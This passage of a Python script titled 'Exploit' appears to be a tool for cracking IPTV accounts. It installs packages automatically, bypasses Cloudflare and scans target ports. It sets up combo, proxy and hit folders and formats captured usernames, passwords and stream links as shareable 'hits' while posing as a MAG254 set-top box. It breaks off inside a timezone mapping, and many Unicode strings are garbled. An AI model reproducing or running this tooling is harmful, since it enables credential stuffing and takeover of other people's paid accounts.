import os, pip, sys, copy, re
import functools, json, string
import threading, codecs, select
import datetime, time, struct
from datetime import date
from queue import PriorityQueue
from socket import AF_INET, socket
from socket import SOCK_STREAM
from concurrent.futures import ThreadPoolExecutor, thread
from urllib.parse import urlparse
from optparse import OptionParser
from _socket import SHUT_RDWR
from collections import deque
try:
    import m3u8
except:
    pip.main(['install', 'm3u8'])
    import m3u8

try:
    import colorama
except:
    pip.main(['install', 'colorama'])

from colorama import Fore,Back, init
init()
try:
    import androidhelper as sl4a

    ad = sl4a.Android()
except:
    pass

try:
    import threading
except:
    pass

try:
    import requests
    import cfscrape
except:
    print("requests module not found \n requests module installing now... \n")
    pip.main(['install', 'requests'])
import requests
import urllib3
try:
    import sock
except:
    print("sock module not found \n sock module installing now \n")
    pip.main(['install', 'requests[socks]'])
    pip.main(['install', 'sock'])
    pip.main(['install', 'socks'])
    pip.main(['install', 'PySocks'])

try:
    import openpyxl
except:
    print("openpyxl  module not found \n xlsxwriter module installing now \n")
    pip.main(['install', 'openpyxl'])
    pip.main(['install', 'requests[openpyxl]'])
from openpyxl.styles import PatternFill
from openpyxl.worksheet.dimensions import ColumnDimension, DimensionHolder
from openpyxl.utils import get_column_letter
from openpyxl import Workbook
from openpyxl import load_workbook
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import cfscrape

    sesq2 = requests.Session()
    ses2 = cfscrape.create_scraper(sess=sesq2)
except:
    ses2 = requests.Session()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
NAME = 'Exploit'
sys.stdout.write(f"\033]2;{NAME}\007")   
if not os.path.exists('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‡ğˆğ“ğ’/'):
    os.makedirs('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‡ğˆğ“ğ’/')
if not os.path.exists('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğŒğŸ‘ğ”/'):
    os.makedirs('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğŒğŸ‘ğ”/')
if not os.path.exists('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğğŒğğ/'):
    os.makedirs('/sdcard/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğğŒğğ/')
# Faz a script mostrar as cores no painel
ESC = '\33['
RST = ESC + '0m'
BOLD = ESC + '1m'
#COLORS
P = ESC + '30m' # Preto
PC = ESC + '90m' # cinza
V = ESC + '31m' # Vermelho
VC = ESC + '91m' # Vermelho claro
VD = ESC + '32m' # Verde
VDC = ESC + '92m' # Verde claro
A = ESC + '33m' # Amarelo
AC = ESC + '93m' # Amarelo claro
AZ = ESC + '34m' # Azul
AZC = ESC + '94m' # Azul claro
M = ESC + '35m' # Magenta
MC = ESC + '95m' # Magenta claro
C = ESC + '36m' # Ciano
CC = ESC + '96m' # Ciano claro
B = ESC + '37m' # Branco
BC = ESC + '97m' # Branco muito forte
#EXTRAS COLORS
VDB = ESC + '1;32m' # Verde + Negrito
CB = ESC + '97;100m' # Fundo cinza + branco
PB = ESC + '90;100m' # Fundo cinza + preto

#-----------------VARIABLES MODIFICABLES--------------------------------
import traceback

PUERTO_INICIO_SCAN=0
PUERTO_FIN_SCAN=37000
SCAN_LENTO=0
SCAN_NORMAL=1
SCAN_PORTS_LOCAL=0
SCAN_PORTS_WEB=1
DEFAULT_VULNERABLES_PORTS={21, 22, 25, 53, 80, 110, 119, 143, 443, 465, 563, 587, 826, 993, 995, 1421, 2052, 2053, 2077, 2078, 2082, 2083, 2086, 2087, 2091, 2095, 2096, 3306, 7080, 7392, 7999, 8080, 8081, 8086, 8443, 8880, 9098, 9112, 9912, 9992, 15001, 24564, 25461, 25461, 25462, 25462, 25463, 25867, 31210, 37000, 45463, 46000, 46500, 43, 443, 444, 25463, 8443, 8444, 8436, 8000, 38305, 60468, 8001, 8002, 8880, 7081, 7082,
            7083, 7084, 8888, 8007, 8075, 8065, 8081, 8013, 8767, 88, 81, 25555, 80, 8083, 5909, 17655,
            9992, 18554, 9191, 46000, 6379, 2085, 2083, 2096, 2053, 2082, 1112, 2446, 2095, 2087, 2086,
            2052, 28506, 25459, 25467, 25222, 7575, 3388, 6758, 6767, 6453, 6923, 28000, 25443, 23000,
            3500, 24000, 7899, 7474, 25461, 4512, 4935, 5795, 9000, 31000, 9192, 22222, 37500, 41003,
            41002, 25500, 25000, 7980, 15003, 2406, 32400, 1453, 25613, 4040, 5899, 5777, 25444,8080, 9443,
            18001, 52000, 6430, 9832, 18003, 9993, 6083, 6053, 4083, 4053, 3083, 3053, 4443, 36000, 18443,
            15443, 16443, 14443, 18003, 16003, 14003, 5076, 5053, 5083, 3443, 3444, 4444, 25462, 25461,
            14886, 14861, 14863, 13725, 13727, 13694, 24500, 13745, 14463, 15463, 25443, 2023, 3023, 4023,
            22, 2095, 2103, 3127, 3260, 3877, 4795, 5319, 10053, 10190, 11270, 12827, 13018, 13494, 17205,
            18337, 21137, 24056, 24611, 2096, 2087,8585, 9485, 6620, 6430, 6420, 6421, 45463, 10050, 1987,3131,9654,3218,4875,1551,777,7413,7521,1282,15515,9563,8952,4144,8549,9741,7441,6541,5148,9654,61000,64001,24001,16002,37000,8447,25469,1971}
#-----------------------------------configuraciones--------------------------------------
hitc=0
scanPORTTYPE="LOCAL" #WEB O LOCAL
scanPORTTYPE="WEB"
debug=False#para imprimir las lineas de depuraciÃ³n True | False
totalHilosConsumidores=20
totalHilosProductores=400
_puertoINICIO_SCAN=0
_puertoFIN_SCAN=65535
#-----------------------------------configuraciones--------------------------------------
import platform
lock = threading.Lock()
lockContenedorDatos=threading.Lock()
version=1.16
cadena = " \33[30;42mVersion:" + str(version) + "\33[0m"

logopic=(f'''{A}
\033[38;5;191m  ___          _     _ _   
\033[38;5;100m | __|_ ___ __| |___(_) |_ 
\033[38;5;174m | _|\ \ / '_ \ / _ \ |  _|
\033[38;5;208m |___/_\_\ .__/_\___/_|\__|
 \033[38;5;222m        |_| 
{RST}''')

my_os=platform.system()
hitc=0
rootDir=""
if (my_os == "Windows"):
    rootDir = "."  # windows. the user has to create a directoy with this name, at the same directory  that py script
else:
    rootDir = "/sdcard"  # android
decode_hex = codecs.getdecoder('hex_codec')

#Metodo que crea los directorios usados por el script
def crearDirectoriosBase():
    if os.path.exists(rootDir + "/debug") == False:
        os.mkdir(rootDir + "/debug")
    if os.path.exists(rootDir + "/hits") == False:
        os.mkdir(rootDir + "/hits")
#    if os.path.exists(rootDir + "/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğ¨ğ¦ğ›ğ¨ğ¬ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­ğ†ğğ«ğšğ¥") == False:
#        os.mkdir(rootDir + "/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğ¨ğ¦ğ›ğ¨ğ¬ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­ğ†ğğ«ğšğ¥")

global time_
global hora_ini
time_ = time.localtime()
hora_ini = time.strftime('%H:%M â— %d.%m.%Y', time_)
#---------------------------------------------SCANPORTS--------------------------------------------------
#clase para localizar los puertos abiertos de una url
class PortScanner:
    header1 = {
        "Host": "www.ipfingerprints.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript,*/*; q=0.01",
        "Content-Type": f"application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent":f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Origin": f"https://www.ipfingerprints.com",
        "Referer": f"https://www.ipfingerprints.com/portscan.php",
        "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
        "Accept-Encoding": "gzip, deflate"
        }

    def tratarSalidaPuertos(self,_entrada: dict):
        # primero separamos por lineas
        separada: list
        puertos = []
        cadena = _entrada['portScanInfo']
        separada = cadena.split("\n")

        for elemento in separada:
            if (elemento.find("tcp") >= 0):
                if (elemento.find("open") >= 0):
                    pos = elemento.find("/")
                    puertos.append(int(elemento[:pos]))
        return puertos
    def createCoockiePanel(self, _host, _startport, _endport):
        coockieDat = {
            "remoteHost": _host,
            "start_port": _startport,
            "end_port": _endport,
            "normalScan": "Yes",
            "scan_type": "connect",
            "ping_type": "none"
        }
        return coockieDat

    def searchOpenPorts_WEB(self, initPort: int, finishPort: int, ipServerToScan: str):
        print("\33[32m Scannen von Ports mit der Webmethode:\n â¥  \33[0m", ipServerToScan)

        parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
        try:
            dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1, data=parametros, timeout=300)  # si en 100 segundos no tenemos respuesta, cancelamos la consulta
            puertos = self.tratarSalidaPuertos(dat.json())
            return puertos
        except Exception as errp:
            print("Error invocando a url para detectar puertos:", errp)
            return []


#        # metodo que scanea un puerto de una ip
#        def test_port_number(self, host, port):
#            # create and configure the socket
#            with socket(AF_INET, SOCK_STREAM) as sock:
#                # set a timeout of a few seconds
#                sock.settimeout(5)
#                # connecting may fail
#                try:
#                    # attempt to connect
#                    sock.connect((host, port))
#                    if debug:
#                        cadena="\t\tPuerto encontrado para:"+ host+ ":"+ str(port)
#                        print(cadena)
#                    # a successful connection was made
#                    sock.shutdown(SHUT_RDWR)
#                    sock.close()
#                    return True
#                except:
#                    # ignore the failure
#                    sock.close()
#                    return False

    #metodo que scanea un puerto de una ip
    def test_port_number(self,host, port):
        # create and configure the socket
        with socket(AF_INET, SOCK_STREAM) as sock:
            # set a timeout of a few seconds
            sock.settimeout(5)
            # connecting may fail
            try:
                # attempt to connect
                sock.connect((host, port))
                print("Port found for:",host,":",port)
                # a successful connection was made
                sock.shutdown(SHUT_RDWR)
                sock.close()
                return True
            except:
                # ignore the failure
                sock.close()
                return False



#        def port_scan(self, host, port: range, _scanTYPE,_scaneoLento:bool):
#            if _scanTYPE == SCAN_PORTS_WEB:
#                return self.searchOpenPorts_WEB(port.start, port.stop, host)
#            else:
#                return self.test_port_numberLOCAL(host, port, _scaneoLento)



    def port_scan(self,host, port:range,_scaneoLento):
        if scanPORTTYPE=="WEB":
            return self.searchOpenPorts_WEB(port.start,port.stop,host)
        if scanPORTTYPE=="LOCAL":
            return self.test_port_numberLOCAL(host,port,_scaneoLento)

    # scanea un rango de puertos, lanzando multiples  hilos para acelerar el scaneo
    def test_port_numberLOCAL(self, host, ports, scaneLento:bool):
        print(f'Scanning Ports with Local Method:{host}...')
        # create the thread pool
        totalHilos = len(ports)
        if scaneLento == True:
            totalHilos = 1
        # with ThreadPoolExecutor(len(ports)) as executor:
        with ThreadPoolExecutor(totalHilos) as executor:
            # dispatch all tasks
            # results = executor.map(self.test_port_number, [host] * len(ports), ports)
            results = executor.map(self.test_port_number, [host] * len(ports), ports)
            # report results in order
            openPorts = []
            for port, is_open in zip(ports, results):  # anlizamos los datos de cada hilo, y los devolvemos en una liusta
                if is_open:
                    openPorts.append(port)
            if (debug):
                print("Ports:", openPorts)
            return openPorts

#---------------------------------------------HITDATA----------------------------------------------------
# class that stores the HIT info
class HitData:
    portal = ""
    url = ""
    m3uURL = ""
    user = ""
    password = ""
    caducidad = ""
    outputFormats = ""
    conexionesActivas = ""
    maxConexiones = ""
    timezone = ""
    panel = ""
    port = ""
    real = ""
    vpn = ""
    nick = ""
    accountType = "no data"
    m3uValid=""
    serial=""
    shortSerial=""
    deviceID1=""
    deviceID2=""
    realc = url + ':' + port
    def setData(self, portalName: str, url: str, m3uUrl: str, user: str, password: str, outputFormats: str, ficheroAsociado: str, puerto: str, nick: str):
        self.portal = portalName
        self.panel = portalName
        self.url = url
        self.outputFormats = outputFormats
        self.m3uURL = m3uUrl
        self.user = user
        self.password = password
        self.ficherosSalida = ficheroAsociado
        self.livelist = liveList
        self.vodlist = vodList
        self.serieslist = serieList
        self.port = puerto
        self.nick = nick
        
    def __str__(self):
        output = """
ğŸ¥·â–‚â–‚â–‚âœ­ğ“ğ‘ğŸ”±ğ„âœ˜ğâœ­â–‚â–‚â–‚ğŸ¥·
âªâª ğ• â„³ğŸ›Æ²Â Ï»à¸„x â¦ Ğ„âœ˜ÏÆ–Î¿Î¹Ï„ ğ• â«â«
âœª Pâ¢ http://"""+self.panel+"""
âœª R â¢ http://"""+self.url+"""
âœª PoÊ€á´› â¢ """+self.port+"""
âœª Usá´‡Ê€ â¢ """+self.user+"""
âœª Pá´€ss â¢ """+self.password+"""
âœª Exá´˜ â¢ """+self.caducidad+"""
âœª Cá´É´É´ â¢ á´€á´„á´›â€£"""+self.conexionesActivas+""" âƒ á´á´€xâ€£"""+self.maxConexiones+"""
âœª á´Éœá´œ sá´›á´€á´›á´œs â¢ """+self.m3uValid+"""
âœª HÉªá´›s Ê™Ê â˜ """+self.nick+""" â˜œ
âœª TZá´É´á´‡ â¢ """+self.timezone+"""
âœª FoÊ€á´á´€á´›s â¢ """+self.outputFormats+"""
âœ¦ Gá´‡á´›-á´˜ÊğŸ‘‡
âœªâ„³ğŸ›Æ²Â Ï»à¸„x â¦ Ğ„âœ˜ÏÆ–Î¿Î¹Ï„ ğ• -á´˜Ê
âœª âªâª  á´˜Ê á´„á´É´Ò“ÉªÉ´É¢ Ê™Ê É´á´Ê™á´á´…Ê  â«â«
â–„â–„ï¸»ãƒ‡ğ— ğŸ¯ğ—¨ğŸ”±ğ‹ğ¢ğ§ğ¤1â•ä¸€ â€» http://"""+self.url+"""/get.php?username="""+self.user+"""&password="""+self.password+"""&type=m3u_plus
â–„â–„ï¸»ãƒ‡ğ— ğŸ¯ğ—¨ğŸ”±ğ‹ğ¢ğ§ğ¤2â•ä¸€ â€» """+self.m3uURL+"""&output=m3u8
â–„â–„ï¸»ãƒ‡ğ—˜ğ—£ğ—šğŸ”±ğ‹ğ¢ğ§ğ¤â•â•ä¸€ â€» http://"""+self.url+"""/xmltv.php?username="""+self.user+"""&password="""+self.password
        if (self.livelist != ""):
            output = output+"""
âœª ğ‹ğˆğ•ğ„â—ğ‹ğˆğ’ğ“ âœª
    â•š{"""+str(self.livelist)+"#ğ•ƒğ•€ğ•ğ”¼}"
        return output

#---------------------------------------------SCANPORTS--------------------------------------------------

class InfoServer:
    lista_puertosIP:dict
    host:str
    listaDNS:dict
    canalesM3U=""
    def __init__(self):
        self.lista_puertosIP=dict()
        self.listaDNS=dict()

# check the combo and hit paths directories
def checkDirestories():  # each os has its own path
    if os.path.exists(rootDir + "/combo") == False:
        os.mkdir(rootDir + "/combo")
    if os.path.exists(rootDir + "/hits") == False:
        os.mkdir(rootDir + "/hits")
    if os.path.exists(rootDir + "/proxies") == False:
        os.mkdir(rootDir + "/proxies")
        



#---------------------------------------------M3U_UTILS--------------------------------------------------
class M3U_UTILS:
    HEADER1_M3U = {
        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    }
    def getHeaderM3U_withHOST(self,host):
        HEADER1_m3u = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip,deflate",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Connection": "keep-alive",
            "Host": host,
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"
        }
        return HEADER1_m3u
    #Metodo que extrae los campos de una peticion de info a una m3u de los datos del usuarios
    def extractDataFromList(self,user: str, passw: str, reponseMessage: str, panel: str, hitData: HitData):
        try:
            hitData.panel = panel
            hitData.user = user
            hitData.password = passw
            acon = ""
            acon = reponseMessage.split('active_cons":')[1]
            acon = acon.split(',')[0]
            acon = acon.replace('"', "")
            hitData.conexionesActivas = acon
            mcon = reponseMessage.split('max_connections":')[1]
            mcon = mcon.split(',')[0]
            mcon = mcon.replace('"', "")
            hitData.maxConexiones = mcon
            timezone = reponseMessage.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.split('"}')[0]            
            timezone = timezone.replace("\/", "/")
            timezone = timezone.replace('Africa/Windhoek', 'ğŸ‡³ğŸ‡¦Windhoek[NA]')
            timezone = timezone.replace('Africa/Abidjan', 'ğŸ‡¨ğŸ‡®Abidjan[CI]')
            timezone = timezone.replace('Africa/Accra', 'ğŸ‡¬ğŸ‡­Accra[GH]')
            timezone = timezone.replace('Africa/Addis_Ababa', 'ğŸ‡ªğŸ‡¹Addis Ababa[ET]')
            timezone = timezone.replace('Africa/Algiers', 'ğŸ‡©ğŸ‡¿Algiers[DZ]')
            timezone = timezone.replace('Africa/Asmara', 'ğŸ‡ªğŸ‡·Asmara[ER]')
            timezone = timezone.replace('Africa/Asmera', 'ğŸ‡ªğŸ‡·Asmera[ER]')
            timezone = timezone.replace('Africa/Bamako', 'ğŸ‡²ğŸ‡±Bamako[ML]')
            timezone = timezone.replace('Africa/Bangui', 'ğŸ‡¨ğŸ‡«Bangui[CF]')
            timezone = timezone.replace('Africa/Banjul', 'ğŸ‡¬ğŸ‡²Banjul[GM]')
            timezone = timezone.replace('Africa/Bissau', 'ğŸ‡¬ğŸ‡¼Bissau[GW]')
            timezone = timezone.replace('Africa/Blantyre', 'ğŸ‡²ğŸ‡¼Blantyre[MW]')
            timezone = timezone.replace('Africa/Brazzaville', 'ğŸ‡¨ğŸ‡¬Brazzaville[CG]')
            timezone = timezone.replace('Africa/Bujumbura', 'ğŸ‡§ğŸ‡®Bujumbura[BI]')
            timezone = timezone.replace('Africa/Cairo', 'ğŸ‡ªğŸ‡¬CairoPT[EG]')
            timezone = timezone.replace('Africa/Casablanca', 'ğŸ‡²ğŸ‡¦Casablanca[MA]')
            timezone = timezone.replace('Africa/Ceuta', 'ğŸ‡ªğŸ‡¸Ceuta[ES]')
            timezone = timezone.replace('Africa/Conakry', 'ğŸ‡¬ğŸ‡³Conakry[GN]')
            timezone = timezone.replace('Africa/Dakar', 'ğŸ‡¸ğŸ‡³Dakar[SN]')
            timezone = timezone.replace('Africa/Dar_es_Salaam', 'ğŸ‡¹ğŸ‡¿Dar es Salaam[TZ]')
            timezone = timezone.replace('Africa/Djibouti', 'ğŸ‡©ğŸ‡¯Djibouti[DJ]')
            timezone = timezone.replace('Africa/Douala', 'ğŸ‡¨ğŸ‡²Douala[CM]')
            timezone = timezone.replace('Africa/El_Aaiun', 'ğŸ‡ªğŸ‡­El Aaiun[EH]')
            timezone = timezone.replace('Africa/Freetown', 'ğŸ‡¸ğŸ‡±Freetown[SL]')
            timezone = timezone.replace('Africa/Gaborone', 'ğŸ‡§ğŸ‡¼Gaborone[BW]')
            timezone = timezone.replace('Africa/Harare', 'ğŸ‡¿ğŸ‡¼Harare[ZW]')
            timezone = timezone.replace('Africa/Johannesburg', 'ğŸ‡¿ğŸ‡¦Johannesburg[ZA]')
            timezone = timezone.replace('Africa/Juba', 'ğŸ‡¸ğŸ‡¸Juba[SS]')
            timezone = timezone.replace('Africa/Kampala', 'ğŸ‡ºğŸ‡¬Kampala[UG]')
            timezone = timezone.replace('Africa/Khartoum', 'ğŸ‡¸ğŸ‡©Khartoum[SD]')
            timezone = timezone.replace('Africa/Kigali', 'ğŸ‡·ğŸ‡¼Kigali[RW]')
            timezone = timezone.replace('Africa/Kinshasa', 'ğŸ‡¨ğŸ‡©Kinshasa[CD]')
            timezone = timezone.replace('Africa/Lagos', 'ğŸ‡³ğŸ‡¬Lagos[NG]')
            timezone = timezone.replace('Africa/Libreville', 'ğŸ‡¬ğŸ‡¦Libreville[GA]')
            timezone = timezone.replace('Africa/Lome', 'ğŸ‡¹ğŸ‡¬LomÃ©[TG]')
            timezone = timezone.replace('Africa/Luanda', 'ğŸ‡¦ğŸ‡´Luanda[AO]')
            timezone = timezone.replace('Africa/Lubumbashi', 'ğŸ‡¨ğŸ‡©Lubumbashi[CD]')
            timezone = timezone.replace('Africa/Lusaka', 'ğŸ‡¿ğŸ‡²Lusaka[ZM]')
            timezone = timezone.replace('Africa/Malabo', 'ğŸ‡¬ğŸ‡¶Malabo[GQ]')
            timezone = timezone.replace('Africa/Maputo', 'ğŸ‡²ğŸ‡¿Maputo[MZ]')
            timezone = timezone.replace('Africa/Maseru', 'ğŸ‡±ğŸ‡¸Maseru[LS]')
            timezone = timezone.replace('Africa/Mbabane', 'ğŸ‡¸ğŸ‡¿Mbabane[SZ]')
            timezone = timezone.replace('Africa/Mogadishu', 'ğŸ‡¸ğŸ‡´Mogadishu[SO]')
            timezone = timezone.replace('Africa/Monrovia', 'ğŸ‡±ğŸ‡·Monrovia[LR]')
            timezone = timezone.replace('Africa/Nairobi', 'ğŸ‡°ğŸ‡ªNairobi[KE]')
            timezone = timezone.replace('Africa/Ndjamena', 'ğŸ‡¹ğŸ‡©Ndjamena[TD]')
            timezone = timezone.replace('Africa/Niamey', 'ğŸ‡³ğŸ‡ªNiamey[NE]')
            timezone = timezone.replace('Africa/Nouakchott', 'ğŸ‡²ğŸ‡·Nouakchott[MR]')
            timezone = timezone.replace('Africa/Ouagadougou', 'ğŸ‡§ğŸ‡«Ouagadougou[BF]')
            timezone = timezone.replace('Africa/Porto-Novo', 'ğŸ‡§ğŸ‡¯Porto-Novo[BJ]')
            timezone = timezone.replace('Africa/Sao_Tome', 'ğŸ‡¸ğŸ‡¹SÃ£o TomÃ©[ST]')
            timezone = timezone.replace('Africa/Timbuktu', 'ğŸ‡²ğŸ‡±Timbuktu[ML]')
            timezone = timezone.replace('Africa/Tripoli', 'ğŸ‡±ğŸ‡¾Tripoli[LY]')
            timezone = timezone.replace('Africa/Tunis', 'ğŸ‡¹ğŸ‡³Tunis[TN]')
            timezone = timezone.replace('America/Adak', 'ğŸ‡ºğŸ‡¸Adak[US]')
            timezone = timezone.replace('America/Anchorage', 'ğŸ‡ºğŸ‡¸Anchorage[US]')
            timezone = timezone.replace('America/Anguilla', 'ğŸ‡¦ğŸ‡®Anguilla[AI]')
            timezone = timezone.replace('America/Antigua', 'ğŸ‡¦ğŸ‡¬Antigua[AG]')
            timezone = timezone.replace('America/Araguaina', 'ğŸ‡§ğŸ‡·AraguaÃ­na[BR]')
            timezone = timezone.replace('America/Argentina/Buenos_Aires', 'ğŸ‡¦ğŸ‡·Buenos Aires[AR]')
            timezone = timezone.replace('America/Argentina/Catamarca', 'ğŸ‡¦ğŸ‡·Catamarca[AR]')
            timezone = timezone.replace('America/Argentina/ComodRivadavia', 'ğŸ‡¦ğŸ‡·ComodRivadavia[AR]')
            timezone = timezone.replace('America/Argentina/Cordoba', 'ğŸ‡¦ğŸ‡·CÃ³rdoba[AR]')
            timezone = timezone.replace('America/Argentina/Jujuy', 'ğŸ‡¦ğŸ‡·Jujuy[AR]')
            timezone = timezone.replace('America/Argentina/La_Rioja', 'ğŸ‡¦ğŸ‡·La Rioja[AR]')
            timezone = timezone.replace('America/Argentina/Mendoza', 'ğŸ‡¦ğŸ‡·Mendoza[AR]')
            timezone = timezone.replace('America/Argentina/Rio_Gallegos', 'ğŸ‡¦ğŸ‡·RÃ­o Gallegos[AR]')
            timezone = timezone.replace('America/Argentina/Salta', 'ğŸ‡¦ğŸ‡·Salta[AR]')
            timezone = timezone.replace('America/Argentina/San_Juan', 'ğŸ‡¦ğŸ‡·San Juan[AR]')
            timezone = timezone.replace('America/Argentina/San_Luis', 'ğŸ‡¦ğŸ‡·San Luis[AR]')
            timezone = timezone.replace('America/Argentina/Tucuman', 'ğŸ‡¦ğŸ‡·TucumÃ¡n[AR]')
            timezone = timezone.replace('America/Argentina/Ushuaia', 'ğŸ‡¦ğŸ‡·Ushuaia[AR]')
            timezone = timezone.replace('America/Aruba', 'ğŸ‡¦ğŸ‡¼Aruba[AW]')
            timezone = timezone.replace('America/Asuncion', 'ğŸ‡µğŸ‡¾AsunciÃ³n[PY]')
            timezone = timezone.replace('America/Atikokan', 'ğŸ‡¨ğŸ‡¦Atikokan[CA]')
            timezone = timezone.replace('America/Atka', 'ğŸ‡ºğŸ‡¸Atka[US]')
            timezone = timezone.replace('America/Bahia', 'ğŸ‡§ğŸ‡·Bahia[BR]')
            timezone = timezone.replace('America/Bahia_Banderas', 'ğŸ‡²ğŸ‡½BahÃ­a Banderas[MX]')
            timezone = timezone.replace('America/Barbados', 'ğŸ‡§ğŸ‡§Barbados[BB]')
            timezone = timezone.replace('America/Belem', 'ğŸ‡§ğŸ‡·BelÃ©m[BR]')
            timezone = timezone.replace('America/Belize', 'ğŸ‡§ğŸ‡¿Belize[BZ]')
            timezone = timezone.replace('America/Blanc-Sablon', 'ğŸ‡¨ğŸ‡¦Blanc-Sablon[CA]')
            timezone = timezone.replace('America/Boa_Vista', 'ğŸ‡§ğŸ‡·Boa Vista[BR]')
            timezone = timezone.replace('America/Bogota', 'ğŸ‡¨ğŸ‡´BogotÃ¡[CO]')
            timezone = timezone.replace('America/Boise', 'ğŸ‡ºğŸ‡¸Boise[US]')
            timezone = timezone.replace('America/Buenos_Aires', 'ğŸ‡¦ğŸ‡·Buenos Aires[AR]')
            timezone = timezone.replace('America/Cambridge_Bay', 'ğŸ‡¨ğŸ‡¦Cambridge Bay[CA]')
            timezone = timezone.replace('America/Campo_Grande', 'ğŸ‡§ğŸ‡·Campo Grande[BR]')
            timezone = timezone.replace('America/Cancun', 'ğŸ‡²ğŸ‡½CancÃºn[MX]')
            timezone = timezone.replace('America/Caracas', 'ğŸ‡»ğŸ‡ªCaracas[VE]')
            timezone = timezone.replace('America/Catamarca', 'ğŸ‡¦ğŸ‡·Catamarca[AR]')
            timezone = timezone.replace('America/Cayenne', 'ğŸ‡¬ğŸ‡«Cayenne[GF]')
            timezone = timezone.replace('America/Cayman', 'ğŸ‡°ğŸ‡¾Cayman[KY]')
            timezone = timezone.replace('America/Chicago', 'ğŸ‡ºğŸ‡¸Chicago[US]')
            timezone = timezone.replace('America/Chihuahua', 'ğŸ‡²ğŸ‡½Chihuahua[MX]')
            timezone = timezone.replace('America/Ciudad_Juarez', 'ğŸ‡²ğŸ‡½Ciudad JuÃ¡rez[MX]')
            timezone = timezone.replace('America/Coral_Harbour', 'ğŸ‡¨ğŸ‡¦Coral Harbour[CA]')
            timezone = timezone.replace('America/Cordoba', 'ğŸ‡¦ğŸ‡·CÃ³rdoba[AR]')
            timezone = timezone.replace('America/Costa_Rica', 'ğŸ‡¨ğŸ‡·Costa Rica[CR]')
            timezone = timezone.replace('America/Creston', 'ğŸ‡¨ğŸ‡¦Creston[CA]')
            timezone = timezone.replace('America/Cuiaba', 'ğŸ‡§ğŸ‡·CuiabÃ¡[BR]')
            timezone = timezone.replace('America/Curacao', 'ğŸ‡¨ğŸ‡¼CuraÃ§ao[CW]')
            timezone = timezone.replace('America/Danmarkshavn', 'ğŸ‡¬ğŸ‡±Danmarkshavn[GL]')
            timezone = timezone.replace('America/Dawson', 'ğŸ‡¨ğŸ‡¦Dawson[CA]')
            timezone = timezone.replace('America/Dawson_Creek', 'ğŸ‡¨ğŸ‡¦Dawson Creek[CA]')
            timezone = timezone.replace('America/Denver', 'ğŸ‡ºğŸ‡¸Denver[US]')
            timezone = timezone.replace('America/Detroit', 'ğŸ‡ºğŸ‡¸Detroit[US]')
            timezone = timezone.replace('America/Dominica', 'ğŸ‡©ğŸ‡²Dominica[DM]')
            timezone = timezone.replace('America/Edmonton', 'ğŸ‡¨ğŸ‡¦Edmonton[CA]')
            timezone = timezone.replace('America/Eirunepe', 'ğŸ‡§ğŸ‡·EirunepÃ©[BR]')
